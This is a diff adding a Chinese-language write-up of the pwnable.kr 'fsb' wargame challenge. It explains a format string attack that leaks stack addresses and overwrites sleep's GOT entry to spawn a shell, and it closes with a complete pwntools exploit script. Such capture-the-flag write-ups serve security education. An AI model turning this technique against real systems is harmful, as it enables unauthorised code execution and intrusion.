@@ -73,3 +73,106 @@ if __name__ == "__main__":
 
 
 
+### fsb
+
+#### 题面
+
+> Isn't FSB almost obsolete in computer security?
+> Anyway, have fun with it :)
+>
+> ssh fsb@pwnable.kr -p2222 (pw:guest)
+>
+> On Aug 15,2018
+
+#### 大致分析
+
+明显的格式化字符串漏洞类型的题目，由于buf不在栈上，我们需要借助栈上的其他数据如ebp来作为跳板。
+
+类似的题目还有[HITCON-Training-lab9](https://l1b0.github.io/2018/08/08/Format-String-Bug-Training/)
+
+题目流程大致是经过四次`read`和`printf`的fsb利用后，check输入的pw和程序随机出来的key是否相等。
+
+我一开始想的是把key的bss段地址放到栈上，然后通过任意地址读得到key，但后来发现程序生成的key太大了，而pw的输入限制长度为10，所以不可能通过正常流程拿到权限。
+
+那后来就覆盖sleep的got表的真实地址为`execve('/bin/sh')`，过程正好用了四次fsb。
+
+> 1. 泄露栈的esp，方便后面定位栈上其他的地址
+> 2. 泄露main的ebp，由于main的ebp和栈上的偏移不固定，所以需要单独泄露一次
+> 3. 将main的ebp覆盖为sleep的got表地址
+> 4. 将sleep的got表地址覆盖为`execve('/bin/sh')`
+
+#### exp如下
+
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+__Auther__ = 'L1B0'
+
+from pwn import *
+from sys import *
+#context.log_level = 'debug'
+context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]
+
+if argv[1] == 'l':
+	io = process('./fsb')
+else:
+	io = ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')
+
+def DEBUG():
+
+	gdb.attach(io,"b *0x08048608\nc")
+
+def leak_esp():
+
+	payload = "+%14$x+"
+	io.sendline(payload)
+	io.recvuntil('+')
+	esp = int(io.recvuntil('+')[:-1],16)-0x50
+
+	return esp
+
+def leak_ebp_main():
+
+	payload = "+%18$x+"
+	io.sendline(payload)
+	io.recvuntil('+')
+	ebp_main = int(io.recvuntil('+')[:-1],16)
+
+	return ebp_main
+
+def ebp_main_to_got():
+
+	got_addr = 0x0804A008 
+
+	payload = "%{}c%18$n".format(got_addr)
+	io.sendline(payload)
+
+def sleep_to_flag(offset):
+
+	flag_addr = 0x080486AB
+	payload = "%{}c%{}$hn".format(flag_addr&0xffff,offset)
+	io.sendline(payload)
+
+if __name__ == '__main__':
+
+	esp = leak_esp()
+	print hex(esp)
+	pause()
+
+	ebp_main = leak_ebp_main()
+	print hex(ebp_main)
+	pause()
+
+	ebp_main_to_got()
+	pause()
+
+	offset = (ebp_main-esp)/4
+	sleep_to_flag(offset)
+	pause()
+
+	io.interactive()
+```
+
+#### References:
+
+- https://blog.csdn.net/SmalOSnail/article/details/53705774
